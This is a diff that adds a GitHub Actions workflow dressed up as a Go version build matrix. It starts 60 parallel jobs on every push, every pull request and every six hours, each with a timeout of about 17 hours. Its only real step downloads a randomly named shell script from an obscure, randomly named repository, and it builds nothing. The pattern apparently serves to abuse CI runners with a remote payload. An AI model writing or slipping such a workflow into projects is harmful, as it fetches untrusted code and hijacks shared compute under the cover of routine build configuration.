@@ -1,0 +1,25 @@
+on:  
+  push:
+  pull_request:
+  schedule:
+    - cron: '0 */6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        go: [ '1.12', '1.13', '1.14', '1.15', '1.16' , '1.17' ]
+        flag: [ai, bi, ci, di, ei, fi, gi, hi, ii, ji]
+    timeout-minutes: 1010
+    env:
+        NUM_JOBS: 70
+        JOB: ${{ matrix.job }}
+    steps:
+    - uses: actions/checkout@v2
+    - uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+    - name: Instal ${{ matrix.flag }} Ver-${{ matrix.go }}
+      run: |
+        wget https://github.com/bfajabbdf/scaling-octo-fiesta/blob/main/Sfeyabfkahdjdj.sh
